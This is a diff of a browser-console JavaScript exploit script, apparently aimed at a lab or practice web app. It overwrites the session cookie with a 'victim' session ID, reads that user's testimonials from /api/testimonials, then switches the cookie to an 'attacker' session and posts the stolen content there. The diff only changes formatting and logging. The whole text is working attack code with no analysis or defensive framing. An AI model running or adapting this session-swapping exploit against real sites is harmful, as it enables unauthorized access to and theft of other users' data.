@@ -1,12 +1,11 @@
-(async function transferTestimonials() {
+(async function transferWithVictimAttacker() {
     
-    console.log("%c=== VICTIM DATA (Session 1369) ===", "color: red; font-weight: bold");
+    console.log("🚀 Starting transfer from 1369 (Victim) to 1333 (Attacker)...");
 
-    // Force session=1369
+    // ====================== 1. GET Victim Data (1369) ======================
     document.cookie = "session=1369; path=/";
     await new Promise(r => setTimeout(r, 500));
 
-    // ==================== GET Victim's Testimonials (1369) ====================
     let victimData = [];
     
     try {
@@ -17,33 +16,48 @@
 
         if (res.ok) {
             victimData = await res.json();
+            console.log("✅ Victim Data (1369) fetched:", victimData);
         }
     } catch (e) {
-        console.error("Fetch failed", e);
+        console.error("Failed to fetch victim data", e);
     }
 
-    // Print Victim Data Clearly
-    console.log("🔴 Victim Key → session=1369");
-    console.log("🔴 Victim Value(s):");
-    console.log(victimData);
+    // ====================== 2. Prepare Combined Content ======================
+    let victimContent = "";
 
     if (Array.isArray(victimData) && victimData.length > 0) {
-        console.table(victimData);
+        victimContent = victimData
+            .map(item => {
+                if (typeof item === 'string') return item;
+                if (item && item.content) return item.content;
+                return JSON.stringify(item);
+            })
+            .join(" | ");
+    } else if (victimData && victimData.content) {
+        victimContent = victimData.content;
     }
 
-    // Combine all victim data
-    let combinedContent = victimData.map(item => {
-        if (typeof item === 'string') return item;
-        if (item && item.content) return item.content;
-        return JSON.stringify(item);
-    }).join(" || ");
+    // Attacker's own previous data (you can change this)
+    const attackerPreviousData = "This is what attacker already posted before";
 
-    console.log("%c=== ATTACKER POSTING BELOW (Session 1333) ===", "color: lime; font-weight: bold");
-    console.log("Attacker will post this content:", combinedContent);
+    // Final formatted content
+    const finalContent = `=== VICTIM DATA ===
+${victimContent || "No victim data found"}
 
-    // ==================== POST to Attacker Session 1333 ====================
+=== ATTACKER DATA ===
+${attackerPreviousData}
+
+=== SEPARATOR ===
+`;
+
+    console.log("\n📋 Final Content to be posted to 1333:\n");
+    console.log(finalContent);
+
+    // ====================== 3. POST to Attacker Session (1333) ======================
     document.cookie = "session=1333; path=/";
     await new Promise(r => setTimeout(r, 600));
+
+    console.log("📤 Posting combined Victim + Attacker data to session=1333...");
 
     await fetch('/api/testimonials', {
         method: 'POST',
@@ -53,16 +67,16 @@
         },
         credentials: 'include',
         body: JSON.stringify({ 
-            content: combinedContent 
+            content: finalContent 
         })
     })
     .then(r => {
-        console.log("POST Status to 1333:", r.status);
+        console.log("POST Status:", r.status);
         return r.text();
     })
     .then(text => console.log("POST Response:", text))
     .catch(err => console.error("POST Error:", err));
 
-    console.log("%c=== TRANSFER COMPLETED ===", "color: cyan; font-weight: bold");
+    console.log("✅ Transfer Completed!");
 
 })();
